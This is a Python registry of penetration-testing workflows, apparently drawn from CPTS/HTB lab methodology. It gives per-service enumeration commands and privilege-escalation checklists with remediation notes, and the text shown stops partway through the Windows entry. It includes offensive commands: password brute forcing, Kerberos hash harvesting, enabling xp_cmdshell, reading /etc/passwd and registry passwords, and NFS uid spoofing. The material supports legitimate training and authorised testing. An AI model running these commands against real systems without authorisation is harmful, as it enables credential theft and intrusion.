"""Service workflow registry — paraphrased CPTS/HTB methodology, lab-safe placeholders.

Workflows are inlined as a single registry so the entire methodology surface lives in
one auditable file. Each workflow uses placeholders ([TARGET_IP], [TARGET_HOST],
[DOMAIN], [USER], [PASS], [LHOST], [LPORT]) — the renderer substitutes the ones it
knows and leaves the rest for the operator.
"""

from dataclasses import dataclass


@dataclass(frozen=True)
class Workflow:
    service_id: str
    display_name: str
    title: str
    priority: int  # lower runs earlier; RCE-class < auth < info
    when_to_use: str
    checklist: tuple[str, ...]
    commands: tuple[tuple[str, str], ...]
    expected_output: str
    verification: tuple[str, ...]
    troubleshooting: tuple[tuple[str, str, str], ...]
    report_note: str
    related: tuple[str, ...] = ()
    category: str = "service-enum"


_WORKFLOWS: dict[str, Workflow] = {
    "smb": Workflow(
        service_id="smb",
        display_name="SMB",
        related=("ldap", "kerberos"),
        title="SMB (139/445) — Share & RPC Enumeration",
        priority=10,
        when_to_use="SMB exposed. Start with null-session enumeration before any credentialed attempt.",
        checklist=(
            "Fingerprint SMB dialect and signing posture.",
            "Attempt null-session share listing.",
            "Enumerate shares, users, and password policy via RPC.",
            "Test for MS17-010 and other smb-vuln-* scripts.",
            "Spray any known creds against SMB with NetExec.",
        ),
        commands=(
            (
                "nmap -p139,445 --script smb-protocols,smb2-security-mode,smb-enum-shares,smb-enum-users,smb-vuln-* [TARGET_IP]",
                "Dialect, signing, shares, users, and common vulns in one pass.",
            ),
            ("smbclient -N -L //[TARGET_IP]", "Null-session share listing."),
            (
                "rpcclient -U '' -N [TARGET_IP]",
                "Interactive RPC null session — try `enumdomusers`, `srvinfo`, `netshareenumall`.",
            ),
            ("enum4linux-ng -A [TARGET_IP]", "Comprehensive automated SMB/RPC enumeration."),
            (
                "nxc smb [TARGET_IP] -u [USER] -p [PASS] --shares",
                "Authenticated share listing with effective NTFS permissions.",
            ),
        ),
        expected_output="Share names, RID-enumerated user accounts, OS/build banner, and (with creds) per-share READ/WRITE permissions.",
        verification=(
            "Confirm at least one share is listed (even IPC$ confirms reachability).",
            "If null session is denied, retry with `-U guest%` before concluding the target is hardened.",
        ),
        troubleshooting=(
            (
                "NT_STATUS_ACCESS_DENIED on null session",
                "Null sessions disabled (default since Windows 2003).",
                "Try guest: `smbclient -U guest% -L //[TARGET_IP]`.",
            ),
            (
                "smb-enum-shares returns empty but shares exist",
                "SMB signing or SMBv1 script mismatch.",
                "Use `nxc smb [TARGET_IP] --shares` as the authoritative share lister.",
            ),
            (
                "Cannot write to a writable share",
                "NTFS ACL stricter than the share ACL.",
                "Check effective NTFS perms with `smbmap -H [TARGET_IP] -u [USER] -p [PASS]`.",
            ),
        ),
        report_note="SMB exposure with [null-session/guest access/MS17-010] enabling [share enumeration/user enumeration/RCE]. Recommend disabling SMBv1, enforcing SMB signing, setting RestrictAnonymous=2, and applying MS17-010 (KB4012212).",
    ),
    "http": Workflow(
        service_id="http",
        display_name="HTTP",
        related=("https",),
        title="HTTP (80/8080/8000) — Web Surface Enumeration",
        priority=15,
        when_to_use="Plain HTTP exposed. Treat each port as a distinct application.",
        checklist=(
            "Fingerprint server, framework, and CMS.",
            "Pull `/robots.txt`, `/sitemap.xml`, and any obvious config files.",
            "Run directory and file brute-force with a balanced wordlist.",
            "Enumerate virtual hosts if [DOMAIN] is known.",
            "Inspect login forms and cookie scopes for misconfigurations.",
        ),
        commands=(
            ("whatweb -a3 http://[TARGET_IP]", "Stack fingerprint (server, framework, CMS, JS libs)."),
            ("curl -sI http://[TARGET_IP]/", "Quick header check for stack and auth hints."),
            (
                "feroxbuster -u http://[TARGET_IP] -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt",
                "Recursive content discovery.",
            ),
            (
                "ffuf -u http://[TARGET_IP]/ -H 'Host: FUZZ.[DOMAIN]' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 0",
                "Virtual host discovery against [DOMAIN].",
            ),
            ("nikto -h http://[TARGET_IP]", "Baseline misconfiguration sweep."),
        ),
        expected_output="Server banner, framework version, candidate paths (`/admin`, `/uploads`), and any discovered virtual hosts under [DOMAIN].",
        verification=(
            "Confirm 200/301/302 on at least one discovered path before treating it as real.",
            "Re-request suspicious endpoints with both `Host: [TARGET_HOST]` and the raw IP to detect host-routing.",
        ),
        troubleshooting=(
            (
                "Bruteforce returns identical-size 200 for every path",
                "Catch-all SPA or WAF returning uniform responses.",
                "Filter by size with `-fs <size>` or by word count with `-fw`.",
            ),
            (
                "Site only responds with a specific Host header",
                "Virtual hosting.",
                "Add `[TARGET_IP] [TARGET_HOST]` to `/etc/hosts`; re-run with `-H 'Host: [TARGET_HOST]'`.",
            ),
            (
                "Tools hang or are blocked mid-scan",
                "Rate limit or WAF.",
                "Reduce threads (`-t 10`), add `--delay`, retry from a different source if lab scope permits.",
            ),
        ),
        report_note="HTTP service on [TARGET_IP] exposes [paths/admin interface/version banner]. Recommend removing unnecessary banners, restricting administrative paths, and enforcing TLS for any authenticated functionality.",
    ),
    "https": Workflow(
        service_id="https",
        display_name="HTTPS",
        related=("http",),
        title="HTTPS (443/8443) — TLS Web Surface",
        priority=15,
        when_to_use="TLS-wrapped HTTP exposed. Inspect the certificate for hostnames and SANs before brute-forcing.",
        checklist=(
            "Pull the certificate SAN list — feed any new hostnames into `/etc/hosts`.",
            "Repeat HTTP-style content discovery over TLS.",
            "Check for weak ciphers and TLS misconfigurations if scope allows.",
        ),
        commands=(
            (
                "openssl s_client -connect [TARGET_IP]:443 -servername [TARGET_HOST] </dev/null 2>/dev/null | openssl x509 -noout -text",
                "Inspect certificate, CN, and SAN entries.",
            ),
            ("curl -skI https://[TARGET_HOST]/", "TLS-aware header check."),
            (
                "feroxbuster -u https://[TARGET_HOST] -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -k",
                "TLS content discovery (ignore cert validation in labs).",
            ),
            ("sslscan [TARGET_IP]:443", "Cipher suite and protocol audit."),
        ),
        expected_output="Cert subject/SAN list, server fingerprint, and a baseline path inventory mirrored from the HTTP findings.",
        verification=(
            "Confirm the SANs resolve via your `/etc/hosts` entry, not just DNS.",
            "Re-validate paths discovered on port 80 against port 443 — they often diverge.",
        ),
        troubleshooting=(
            (
                "`SSL certificate problem`",
                "Self-signed lab certificate.",
                "Pass `-k` to curl, `--insecure` to feroxbuster — labs only.",
            ),
            (
                "Server returns default page over IP but real app over hostname",
                "SNI-based virtual hosting.",
                "Always pass `-servername [TARGET_HOST]` to openssl and request the hostname URL.",
            ),
        ),
        report_note="HTTPS endpoint on [TARGET_IP] discloses additional hostnames via certificate SANs and exposes [findings]. Recommend reviewing certificate SAN scope and disabling weak cipher suites flagged by sslscan.",
    ),
    "ftp": Workflow(
        service_id="ftp",
        display_name="FTP",
        title="FTP (21) — Anonymous & Credentialed",
        priority=20,
        when_to_use="FTP exposed. Always try anonymous first — it costs nothing and frequently works on lab targets.",
        checklist=(
            "Banner-grab the FTP version.",
            "Try anonymous login and list root.",
            "Recursively download anything anonymously readable.",
            "If credentialed, check for writable directories that map to web roots.",
        ),
        commands=(
            (
                "nmap -p21 -sV --script ftp-anon,ftp-syst,ftp-bounce [TARGET_IP]",
                "Banner, anonymous flag, and bounce-scan capability.",
            ),
            (
                "ftp -n [TARGET_IP]",
                "Interactive login — try `user anonymous` / blank password, then `ls`.",
            ),
            (
                "wget -m --no-passive ftp://anonymous:anonymous@[TARGET_IP]/",
                "Mirror anonymous FTP content locally.",
            ),
            (
                "hydra -L users.txt -P passwords.txt ftp://[TARGET_IP] -f -V",
                "Credential brute force — lab targets only.",
            ),
        ),
        expected_output="Banner string, anonymous access result, and a directory listing if reachable.",
        verification=(
            "Confirm `230 Login successful` (or equivalent) in raw output before declaring anonymous access.",
            "If files appear, sanity-check that downloads completed (`ls -lah` on the mirror).",
        ),
        troubleshooting=(
            (
                "Anonymous accepted but `ls` hangs",
                "Passive/active mode mismatch.",
                "Toggle `passive` in the FTP client or use `wget --no-passive`.",
            ),
            (
                "Banner shows vsFTPd 2.3.4",
                "Known backdoored build (common CTF lure).",
                "Verify carefully — many labs spoof the banner without the backdoor.",
            ),
        ),
        report_note="FTP service on [TARGET_IP] permits [anonymous read/anonymous write/credentialed access]. Recommend disabling anonymous access, enforcing TLS (FTPS), and restricting upload directories that map to executable paths.",
    ),
    "ssh": Workflow(
        service_id="ssh",
        display_name="SSH",
        title="SSH (22) — Banner, Auth Modes, Key Reuse",
        priority=35,
        when_to_use="SSH exposed. Treat as auth surface — useful for credential reuse, not an exploitation primitive on its own.",
        checklist=(
            "Capture banner and supported auth methods.",
            "Test discovered credentials from other services for reuse.",
            "Check for known weak host keys or outdated OpenSSH versions.",
        ),
        commands=(
            (
                "nmap -p22 -sV --script ssh2-enum-algos,ssh-auth-methods,ssh-hostkey [TARGET_IP]",
                "Banner, supported algorithms, accepted auth methods.",
            ),
            (
                "ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no [USER]@[TARGET_IP]",
                "Force a password auth attempt.",
            ),
            ("ssh -i id_rsa [USER]@[TARGET_IP]", "Reuse a recovered private key."),
        ),
        expected_output="Banner string (OS hint), accepted auth methods (`publickey`, `password`), and either a successful login or a clear rejection.",
        verification=(
            "On a successful login, run `id` and `hostname` to confirm context before claiming access.",
        ),
        troubleshooting=(
            (
                "`Permission denied (publickey)`",
                "Password auth disabled.",
                "Pivot to key reuse or hash spraying — do not brute force unless scope permits.",
            ),
            (
                "`no matching host key type found`",
                "Server only offers legacy host keys.",
                "Add `-oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa`.",
            ),
        ),
        report_note="SSH on [TARGET_IP] accepts [auth methods]. Recommend disabling password authentication, enforcing key-based auth, and removing weak host key algorithms.",
    ),
    "dns": Workflow(
        service_id="dns",
        display_name="DNS",
        related=("ldap", "kerberos"),
        title="DNS (53) — Records, Zone Transfers, Subdomain Discovery",
        priority=30,
        when_to_use="DNS exposed (TCP or UDP). Often gives you the entire AD or web hostname inventory for free.",
        checklist=(
            "Identify the DNS server and any served zones.",
            "Attempt a zone transfer (AXFR) for [DOMAIN].",
            "Brute-force subdomains if AXFR is denied.",
        ),
        commands=(
            (
                "dig @[TARGET_IP] [DOMAIN] any +noall +answer",
                "Pull all records the server is willing to serve.",
            ),
            ("dig @[TARGET_IP] [DOMAIN] axfr", "Attempt zone transfer."),
            (
                "nmap -p53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=[DOMAIN] [TARGET_IP]",
                "AXFR via nmap — useful for evidence capture.",
            ),
            (
                "gobuster dns -d [DOMAIN] -r [TARGET_IP] -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt",
                "Subdomain brute force if AXFR refused.",
            ),
        ),
        expected_output="A list of A, NS, MX, and SRV records — in AD environments, SRV records reveal domain controllers and Kerberos services.",
        verification=(
            "Confirm AXFR output starts with the SOA record and ends with the same SOA — anything shorter is a partial transfer.",
        ),
        troubleshooting=(
            (
                "`Transfer failed.`",
                "AXFR not permitted.",
                "Pivot to subdomain brute force with gobuster/ffuf.",
            ),
            (
                "No reply on UDP/53 but TCP responds",
                "Filtered UDP.",
                "Use TCP queries: `dig +tcp @[TARGET_IP] ...`.",
            ),
        ),
        report_note="DNS server [TARGET_IP] permits [AXFR/recursion]. Recommend restricting zone transfers to known secondaries and disabling recursion for external clients.",
    ),
    "smtp": Workflow(
        service_id="smtp",
        display_name="SMTP",
        related=("ldap",),
        title="SMTP (25/465/587) — User Enumeration & Relay",
        priority=30,
        when_to_use="SMTP exposed. Primary value is VRFY/EXPN/RCPT user enumeration for downstream password spraying.",
        checklist=(
            "Banner-grab.",
            "Enumerate users via VRFY/EXPN/RCPT TO.",
            "Test for open relay (lab only).",
        ),
        commands=(
            (
                "nmap -p25 -sV --script smtp-commands,smtp-enum-users,smtp-open-relay [TARGET_IP]",
                "Capabilities, user enumeration, relay test.",
            ),
            ("smtp-user-enum -M VRFY -U users.txt -t [TARGET_IP]", "Targeted VRFY enumeration."),
            (
                "nc -nv [TARGET_IP] 25",
                "Manual banner grab — issue `EHLO test`, then `VRFY [USER]`.",
            ),
        ),
        expected_output="Banner, supported verbs (VRFY/EXPN), and a list of valid local addresses.",
        verification=(
            "Confirm `252` or `250` for valid users vs `550` for invalid — both must be observed to trust the enumeration.",
        ),
        troubleshooting=(
            (
                "All VRFY responses identical",
                "Server returns generic codes for every name.",
                "Switch to RCPT TO timing or fall back to OSINT/AD user lists.",
            ),
            (
                "Connection drops after EHLO",
                "Server enforces STARTTLS first.",
                "Use `openssl s_client -starttls smtp -connect [TARGET_IP]:25`.",
            ),
        ),
        report_note="SMTP service on [TARGET_IP] permits [user enumeration/open relay]. Recommend disabling VRFY/EXPN, rate-limiting RCPT TO, and requiring authentication for relay.",
    ),
    "ldap": Workflow(
        service_id="ldap",
        display_name="LDAP",
        related=("kerberos", "smb"),
        title="LDAP (389/636) — Directory Enumeration",
        priority=20,
        when_to_use="LDAP exposed (very likely an AD DC). Anonymous binds reveal naming context and sometimes the full user list.",
        checklist=(
            "Probe root DSE for naming contexts.",
            "Attempt anonymous bind and dump users/groups.",
            "If creds available, run `ldapsearch` for full directory dump.",
        ),
        commands=(
            (
                "nmap -p389,636 -sV --script ldap-rootdse,ldap-search [TARGET_IP]",
                "Root DSE, naming contexts, anonymous search.",
            ),
            (
                "ldapsearch -x -H ldap://[TARGET_IP] -s base namingcontexts",
                "Discover the base DN.",
            ),
            (
                "ldapsearch -x -H ldap://[TARGET_IP] -b 'DC=[DOMAIN]' '(objectClass=user)' sAMAccountName",
                "Enumerate users — replace the DC path with the discovered naming context.",
            ),
            (
                "nxc ldap [TARGET_IP] -u [USER] -p [PASS] --users",
                "Authenticated user dump via NetExec.",
            ),
        ),
        expected_output="Default naming context (e.g., `DC=lab,DC=local`), domain functional level, and either an anonymous user list or an authenticated failure code.",
        verification=(
            "Confirm the base DN matches the discovered [DOMAIN] before trusting downstream queries.",
        ),
        troubleshooting=(
            (
                "`Operations error` on anonymous query",
                "Anonymous binds disabled.",
                "Switch to authenticated with a low-priv account or NetExec.",
            ),
            (
                "Connection on 636 fails with TLS error",
                "LDAPS cert mismatch.",
                "Set `LDAPTLS_REQCERT=never` in the env, or use 389 in labs.",
            ),
        ),
        report_note="LDAP service on [TARGET_IP] permits [anonymous/authenticated] enumeration of [users/groups]. Recommend disabling anonymous binds and restricting directory read access to required service accounts.",
    ),
    "kerberos": Workflow(
        service_id="kerberos",
        display_name="Kerberos",
        related=("ldap", "smb"),
        title="Kerberos (88) — Pre-Auth, ASREP & Kerberoasting Surface",
        priority=15,
        when_to_use="Kerberos exposed — you are almost certainly looking at a domain controller for [DOMAIN].",
        checklist=(
            "Have a usernames list ready (from LDAP, SMB, or OSINT).",
            "Validate usernames via AS-REQ without lockout risk.",
            "Pull ASREP roastable hashes for accounts with pre-auth disabled.",
            "Kerberoast SPN-bound accounts if credentials are available.",
        ),
        commands=(
            (
                "kerbrute userenum -d [DOMAIN] --dc [TARGET_IP] users.txt",
                "Validate usernames against the KDC.",
            ),
            (
                "impacket-GetNPUsers [DOMAIN]/ -usersfile users.txt -dc-ip [TARGET_IP] -no-pass -format hashcat",
                "Harvest ASREP-roastable hashes.",
            ),
            (
                "impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [TARGET_IP] -request -outputfile spns.hash",
                "Request TGS-REP hashes for kerberoastable accounts.",
            ),
        ),
        expected_output="A validated list of domain usernames plus zero or more hashcat-format hashes (`$krb5asrep$` for ASREP, `$krb5tgs$` for kerberoast).",
        verification=(
            "Confirm the realm in the AS-REP matches [DOMAIN] — wrong realm means wrong DC.",
            "Sanity-check hash format header before sending to hashcat.",
        ),
        troubleshooting=(
            (
                "`KRB_AP_ERR_SKEW`",
                "Clock drift greater than 5 minutes.",
                "Sync time: `sudo ntpdate [TARGET_IP]` or `sudo rdate -n [TARGET_IP]`.",
            ),
            (
                "`KDC_ERR_C_PRINCIPAL_UNKNOWN` for every user",
                "Wrong realm casing.",
                "Realm must be uppercase, e.g., `LAB.LOCAL`.",
            ),
        ),
        report_note="Kerberos service on [TARGET_IP] exposes [usernames/ASREP-roastable accounts/SPN hashes]. Recommend enabling pre-authentication on all accounts and using strong passwords on service accounts to defeat offline cracking.",
    ),
    "mssql": Workflow(
        service_id="mssql",
        display_name="MSSQL",
        related=("smb",),
        title="MSSQL (1433) — Auth, xp_cmdshell, Linked Servers",
        priority=15,
        when_to_use="MSSQL exposed. Always test with default/blank `sa` first and integrated AD creds second.",
        checklist=(
            "Banner-grab the SQL Server version.",
            "Test default credentials (`sa:`, empty password).",
            "If authenticated, enumerate databases, linked servers, and impersonation rights.",
            "Attempt `xp_cmdshell` enablement if a sysadmin context is reached.",
        ),
        commands=(
            (
                "nmap -p1433 -sV --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password [TARGET_IP]",
                "Version, NTLM hostname disclosure, blank-cred check.",
            ),
            (
                "impacket-mssqlclient [USER]@[TARGET_IP] -windows-auth",
                "Interactive session using Windows auth.",
            ),
            (
                "nxc mssql [TARGET_IP] -u [USER] -p [PASS] -x 'whoami'",
                "Run an OS command if xp_cmdshell is available.",
            ),
        ),
        expected_output="SQL Server version banner, AD hostname/domain via NTLM auth disclosure, and a list of accessible databases on success.",
        verification=(
            "Confirm `whoami` returns a service account (often `nt service\\mssqlserver`) before chaining to OS-level attacks.",
        ),
        troubleshooting=(
            (
                "`SSL Provider error`",
                "TLS without cert validation needed.",
                "Pass `-windows-auth`; for raw clients, set `Encrypt=yes;TrustServerCertificate=yes`.",
            ),
            (
                "`xp_cmdshell` returns `disabled`",
                "Component turned off by policy.",
                "Enable in session: `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;` (requires sysadmin).",
            ),
        ),
        report_note="MSSQL on [TARGET_IP] permits [blank-cred sa/credentialed login/xp_cmdshell]. Recommend disabling `xp_cmdshell`, enforcing strong sysadmin passwords, and restricting linked-server impersonation.",
    ),
    "mysql": Workflow(
        service_id="mysql",
        display_name="MySQL",
        title="MySQL/MariaDB (3306) — Auth, FILE Privilege",
        priority=20,
        when_to_use="MySQL/MariaDB exposed. Anonymous and `root:` empty-password often work on legacy lab targets.",
        checklist=(
            "Banner-grab the MySQL version.",
            "Test anonymous and `root:` empty-password logins.",
            "If authenticated, attempt `LOAD_FILE` to read accessible files.",
        ),
        commands=(
            (
                "nmap -p3306 -sV --script mysql-info,mysql-empty-password,mysql-users [TARGET_IP]",
                "Version, empty-cred check, user list.",
            ),
            ("mysql -h [TARGET_IP] -u root", "Empty-password root login attempt."),
            (
                "mysql -h [TARGET_IP] -u [USER] -p[PASS] -e \"SELECT LOAD_FILE('/etc/passwd');\"",
                "File read via FILE privilege.",
            ),
        ),
        expected_output="Server version banner, login success or specific error code, and file content on a successful `LOAD_FILE`.",
        verification=(
            "Run `SELECT current_user(), @@version, @@hostname;` to confirm context before proceeding.",
        ),
        troubleshooting=(
            (
                "`Host '...' is not allowed to connect`",
                "Bind-address or host ACL restricting access.",
                "Confirm 3306 is reachable from your assigned tester IP — re-scan if unsure.",
            ),
            (
                "`LOAD_FILE` returns NULL",
                "Missing FILE privilege or `secure_file_priv` set.",
                "Check with `SHOW VARIABLES LIKE 'secure_file_priv';`.",
            ),
        ),
        report_note="MySQL service on [TARGET_IP] permits [empty-password root/FILE read]. Recommend enforcing strong root credentials, restricting FILE privilege, and setting `secure_file_priv`.",
    ),
    "rdp": Workflow(
        service_id="rdp",
        display_name="RDP",
        related=("winrm", "smb"),
        title="RDP (3389) — NLA, Credential Validation, BlueKeep",
        priority=15,
        when_to_use="RDP exposed. Primary value is credential validation and lateral movement once AD creds are recovered.",
        checklist=(
            "Determine NLA enforcement and OS build.",
            "Check for BlueKeep (CVE-2019-0708) on legacy Windows.",
            "Validate recovered AD credentials against RDP.",
        ),
        commands=(
            (
                "nmap -p3389 -sV --script rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020 [TARGET_IP]",
                "Encryption modes, NTLM hostname disclosure, legacy vulns.",
            ),
            (
                "nxc rdp [TARGET_IP] -u [USER] -p [PASS]",
                "Validate AD credentials without launching a session.",
            ),
            (
                "xfreerdp /v:[TARGET_IP] /u:[USER] /p:[PASS] /dynamic-resolution +clipboard",
                "Interactive session.",
            ),
        ),
        expected_output="OS build and hostname (via NTLM disclosure), NLA on/off, and a `valid creds` or `STATUS_LOGON_FAILURE` from NetExec.",
        verification=(
            "On a successful session, capture a screenshot of the desktop and the username in the top-right corner as evidence.",
        ),
        troubleshooting=(
            (
                "`Authentication failure, check credentials`",
                "NLA enforcing additional cert/audience checks.",
                "Use `xfreerdp /cert-ignore` and retry with the full `[DOMAIN]\\[USER]` form.",
            ),
            (
                "Session connects then immediately disconnects",
                "Concurrent session limit reached.",
                "Wait and retry, or coordinate with the lab to reset sessions.",
            ),
        ),
        report_note="RDP service on [TARGET_IP] is reachable with NLA [enabled/disabled] and accepts [USER]. Recommend restricting RDP access via a jump host or VPN, enforcing NLA, and applying the BlueKeep patch on legacy systems.",
    ),
    "winrm": Workflow(
        service_id="winrm",
        display_name="WinRM",
        related=("rdp", "smb"),
        title="WinRM (5985/5986) — Remote PowerShell",
        priority=15,
        when_to_use="WinRM exposed. Typically reachable only after recovering valid AD credentials.",
        checklist=(
            "Validate credentials against WinRM.",
            "Open an interactive PowerShell session and confirm execution context.",
        ),
        commands=(
            ("nxc winrm [TARGET_IP] -u [USER] -p [PASS]", "Credential validation."),
            (
                "evil-winrm -i [TARGET_IP] -u [USER] -p [PASS]",
                "Interactive PowerShell over WinRM.",
            ),
        ),
        expected_output="A `Pwn3d!` flag (NetExec) or an interactive prompt confirming code execution as [USER].",
        verification=(
            "Inside the session, run `whoami /all` and `hostname` and capture the output.",
        ),
        troubleshooting=(
            (
                "`WSManFault` with `Access is denied`",
                "User not in `Remote Management Users`.",
                "Try other accounts; check group membership via `nxc smb [TARGET_IP] -u [USER] -p [PASS] --groups`.",
            ),
            (
                "evil-winrm hangs on connect",
                "HTTPS-only (5986) endpoint with cert mismatch.",
                "Retry with `-S` and `-c <cert>`, or use port 5985 if open.",
            ),
        ),
        report_note="WinRM service on [TARGET_IP] accepts [USER] credentials and yields code execution as the same context. Recommend restricting WinRM to administrative jump hosts and removing standard users from `Remote Management Users`.",
    ),
    "nfs": Workflow(
        service_id="nfs",
        display_name="NFS",
        related=("smb",),
        title="NFS (111/2049) — Exports & UID Spoofing",
        priority=20,
        when_to_use="NFS exposed. Default lab exports are often world-readable; uid-spoofing converts a low-priv shell into privileged reads.",
        checklist=(
            "List RPC services — NFS depends on rpcbind on 111.",
            "Enumerate exports via showmount.",
            "Mount each export and inventory ownership/UIDs.",
            "If a writable export exists, plan a uid-spoof for privileged file access.",
        ),
        commands=(
            (
                "nmap -p111,2049 -sV --script=nfs-ls,nfs-showmount,nfs-statfs [TARGET_IP]",
                "RPC version, exports, and a recursive listing in one pass.",
            ),
            ("rpcinfo -p [TARGET_IP]", "Enumerate RPC programs and ports."),
            ("showmount -e [TARGET_IP]", "List NFS exports the server advertises."),
            (
                "sudo mount -t nfs [TARGET_IP]:/[EXPORT] /mnt/nfs -o nolock,vers=3",
                "Mount an export read-only — lab targets only.",
            ),
            (
                "ls -laR /mnt/nfs",
                "Inventory ownership; note interesting UIDs for later uid-spoofing.",
            ),
        ),
        expected_output="A list of exports (`/home`, `/srv/public`, `/opt/...`), per-export read/write capability, and file ownership UIDs once mounted.",
        verification=(
            "Confirm that `showmount -e` and `nmap nfs-showmount` agree; if one is empty, the other usually has the truth.",
            "Always `sudo umount /mnt/nfs` before remounting with different options.",
        ),
        troubleshooting=(
            (
                "`mount.nfs: access denied by server`",
                "Export limited to specific hosts or `no_root_squash` misconfigured.",
                "Try `vers=2` or `vers=3`; confirm the export is scoped to your tester IP in the lab.",
            ),
            (
                "`showmount -e` hangs or returns empty",
                "Server only speaks NFSv4 (no portmapper-style exports list).",
                "Mount the pseudo-root: `sudo mount -t nfs4 [TARGET_IP]:/ /mnt/nfs -o nolock` and walk from `/`.",
            ),
            (
                "`mount: only root can do that`",
                "Tester user lacks mount privileges.",
                "Use `sudo`; in lab VMs sudo is expected for mount operations.",
            ),
        ),
        report_note="NFS service on [TARGET_IP] exposes [exports] readable without authentication. Recommend restricting exports to authorized hosts via `/etc/exports` (`host(rw)` syntax), enabling `root_squash`, and migrating to NFSv4 with Kerberos auth.",
    ),
    "snmp": Workflow(
        service_id="snmp",
        display_name="SNMP",
        title="SNMP (UDP 161) — Community Strings & MIB Walk",
        priority=25,
        when_to_use="SNMP exposed (UDP). `public` and `private` are still common on lab targets and small appliances.",
        checklist=(
            "Brute-force community strings.",
            "Walk the MIB with the discovered string.",
            "Pull users, processes, and installed software OIDs.",
        ),
        commands=(
            (
                "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt [TARGET_IP]",
                "Brute-force community strings.",
            ),
            ("snmpwalk -v2c -c public [TARGET_IP]", "Full MIB walk with the `public` string."),
            (
                "snmpwalk -v2c -c public [TARGET_IP] 1.3.6.1.4.1.77.1.2.25",
                "Windows user accounts OID.",
            ),
        ),
        expected_output="A valid community string plus a MIB tree containing system info, interfaces, processes, and (Windows) user accounts.",
        verification=(
            "Confirm the system description OID (`1.3.6.1.2.1.1.1.0`) returns a useful banner before deep-walking.",
        ),
        troubleshooting=(
            (
                "`Timeout: No Response from ...`",
                "UDP filtering or wrong community string.",
                "Re-scan with `nmap -sU -p161 [TARGET_IP]`; try v1/v2c/v3.",
            ),
            (
                "snmpwalk returns only the system MIB",
                "Read access scoped to the system tree only.",
                "Try alternate communities or accept the limited view.",
            ),
        ),
        report_note="SNMP service on [TARGET_IP] accepts a default community string over [v1/v2c]. Recommend removing default community strings, migrating to SNMPv3 with auth+priv, and restricting source IPs.",
    ),
    "linux-privesc": Workflow(
        service_id="linux-privesc",
        display_name="Linux Privesc",
        related=("pivoting",),
        category="post-foothold",
        title="Linux Privilege Escalation — Post-Foothold Enumeration",
        priority=50,
        when_to_use="You have a shell on a Linux lab target. Enumerate systematically before reaching for exploits — most lab privesc is a misconfiguration, not a kernel CVE.",
        checklist=(
            "Stabilize the shell — upgrade to a full interactive TTY.",
            "Identify the current user, groups, and sudo entitlements.",
            "Enumerate SUID/SGID binaries and file capabilities.",
            "Review cron jobs, writable scripts, and PATH-hijack opportunities.",
            "Check internal listening services and credentials left in config files.",
            "Run an automated enumeration script and triage its highlights.",
        ),
        commands=(
            ("id; sudo -l", "Current context and any explicitly allowed sudo commands."),
            (
                "find / -perm -4000 -type f 2>/dev/null",
                "World-accessible SUID binaries — cross-reference with GTFOBins.",
            ),
            (
                "getcap -r / 2>/dev/null",
                "Files carrying Linux capabilities such as cap_setuid.",
            ),
            (
                "cat /etc/crontab; ls -la /etc/cron.*",
                "Scheduled jobs — look for root-run scripts you can write to.",
            ),
            (
                "./linpeas.sh | tee linpeas.txt",
                "Automated enumeration; triage the high-probability findings first.",
            ),
            ("ss -tlnp", "Internal listening services not exposed to the network."),
        ),
        expected_output="A clear picture of your privileges: sudo entitlements, exploitable SUID binaries or capabilities, writable root-owned cron scripts, and any reused credentials in config files.",
        verification=(
            "Before reporting a vector, reproduce it end-to-end in a scratch directory and capture the `id` output showing `uid=0`.",
            "Re-run `sudo -l` after any credential discovery — new credentials can unlock new sudo rights.",
        ),
        troubleshooting=(
            (
                "`sudo -l` prompts for a password you do not have",
                "No passwordless sudo configured.",
                "Pivot to SUID / capabilities / cron; revisit once you recover the user's password.",
            ),
            (
                "SUID binary exists but the GTFOBins technique fails",
                "Binary is a custom wrapper or has been patched.",
                "Inspect it with `strings` / `ltrace` for what it actually calls; look for relative-path calls you can hijack.",
            ),
            (
                "Automated enumeration output is overwhelming",
                "Too much noise to act on.",
                "Focus on the sudo, SUID, capabilities, cron, and credentials sections first; ignore informational findings until those are exhausted.",
            ),
        ),
        report_note="Privilege escalation on [TARGET_IP] was possible via [misconfiguration — SUID binary / sudo rule / writable cron script]. Recommend removing the unnecessary SUID bit, scoping sudo rules to specific commands, correcting cron script permissions, and applying least privilege to service accounts.",
    ),
    "windows-privesc": Workflow(
        service_id="windows-privesc",
        display_name="Windows Privesc",
        related=("ad-foothold", "pivoting"),
        category="post-foothold",
        title="Windows Privilege Escalation — Post-Foothold Enumeration",
        priority=51,
        when_to_use="You have a shell on a Windows lab target. Enumerate privileges, services, and stored credentials before exploiting — token privileges and service misconfigurations cover most lab cases.",
        checklist=(
            "Identify the current user, groups, and token privileges.",
            "Check for exploitable token privileges (SeImpersonate, SeBackup, etc.).",
            "Enumerate unquoted service paths and weak service permissions.",
            "Search for credentials in files, the registry, and Credential Manager.",
            "Review installed software and patch level for known local exploits.",
            "Run an automated enumeration script and triage its highlights.",
        ),
        commands=(
            (
                "whoami /all",
                "User, group memberships, and token privileges in one view.",
            ),
            (
                "whoami /priv",
                "Privilege list — note SeImpersonatePrivilege and similar escalation-class rights.",
            ),
            (
                "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\"",
                "Service binary paths — look for unquoted paths and writable directories.",
            ),
            (
                "reg query HKLM /f password /t REG_SZ /s",
                "Plaintext credentials left in the registry.",
            ),
            (
                ".\\winPEASany.exe | Out-File winpeas.txt",
                "Automated enumeration; triage the highlighted findings.",
            ),
            (
                "cmdkey /list",
                "Stored credentials potentially usable with `runas /savecred`.",
            ),
        ),
        expected_output="Your token privileges, any unquoted or weak-permission services, and stored credentials — enough to select a single escalation path.",
        verification=(
            "Confirm escalation by capturing `whoami` showing `nt authority\\system` (or the target admin) in a freshly spawned process.",
